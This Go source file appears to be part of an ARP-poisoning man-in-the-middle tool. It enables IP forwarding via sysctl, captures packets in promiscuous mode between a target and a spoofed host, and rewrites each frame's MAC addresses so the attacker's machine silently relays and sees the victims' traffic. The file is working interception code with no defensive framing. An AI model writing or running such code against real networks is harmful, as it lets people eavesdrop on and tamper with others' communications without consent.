package arp_poison

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// enableIPForwarding enables IP forwarding based on the OS
func enableIPForwarding() error {
	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "linux":
		cmd = exec.Command("sysctl", "-w", "net.ipv4.ip_forward=1")
	case "darwin": // macOS
		cmd = exec.Command("sysctl", "-w", "net.inet.ip.forwarding=1")
	default:
		return fmt.Errorf("[!] unsupported operating system: %s", runtime.GOOS)
	}

	if err := cmd.Run(); err != nil {
		return fmt.Errorf("[!] error: %v", err)
	}

	return nil
}

// disableIPForwarding disables IP forwarding based on the OS
func disableIPForwarding() error {
	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "linux":
		cmd = exec.Command("sysctl", "-w", "net.ipv4.ip_forward=0")
	case "darwin": // macOS
		cmd = exec.Command("sysctl", "-w", "net.inet.ip.forwarding=0")
	default:
		return fmt.Errorf("[!] unsupported operating system: %s", runtime.GOOS)
	}

	if err := cmd.Run(); err != nil {
		return fmt.Errorf("[!] error: %v", err)
	}

	return nil
}

func ForwardTraffic(iface string) error {
	// Enable IP forwarding first
	if err := enableIPForwarding(); err != nil {
		return err
	}

	// Ensure IP forwarding is disabled when function returns
	defer disableIPForwarding()

	// Open device
	handle, err := pcap.OpenLive(iface, 65535, true, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("[!] failed to open interface: %v", err)
	}
	defer handle.Close()

	// Set up bidirectional filter
	filter := fmt.Sprintf("(src host %s and dst host %s) or (src host %s and dst host %s)",
		targetIP.String(), spoofIP.String(),
		spoofIP.String(), targetIP.String())

	if err := handle.SetBPFFilter(filter); err != nil {
		return fmt.Errorf("[!] failed to set filter: %v", err)
	}

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		if packet == nil {
			continue
		}

		ethernetLayer := packet.Layer(layers.LayerTypeEthernet)
		if ethernetLayer == nil {
			continue
		}
		eth := ethernetLayer.(*layers.Ethernet)

		newPacket := modifyAndForwardPacket(packet, eth)
		if newPacket != nil {
			if err := handle.WritePacketData(newPacket); err != nil {
				fmt.Printf("[!] Error forwarding packet: %v\n", err)
			}
		}
	}

	return nil
}

func modifyAndForwardPacket(packet gopacket.Packet, eth *layers.Ethernet) []byte {
	var srcMAC, dstMAC net.HardwareAddr
	if eth.SrcMAC.String() == targetMAC.String() {
		srcMAC = attakerMAC
		dstMAC = spoofMAC
	} else if eth.SrcMAC.String() == spoofMAC.String() {
		srcMAC = attakerMAC
		dstMAC = targetMAC
	} else {
		return nil
	}

	newEth := &layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: eth.EthernetType,
	}

	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	// Get the rest of the packet data after the Ethernet layer
	payloadData := packet.Data()[14:]

	err := gopacket.SerializeLayers(buffer, options,
		newEth,
		gopacket.Payload(payloadData),
	)
	if err != nil {
		return nil
	}

	return buffer.Bytes()
}

func StartTrafficForwarding(iface string) {
	if err := ForwardTraffic(iface); err != nil {
		time.Sleep(5 * time.Second)
	}
}
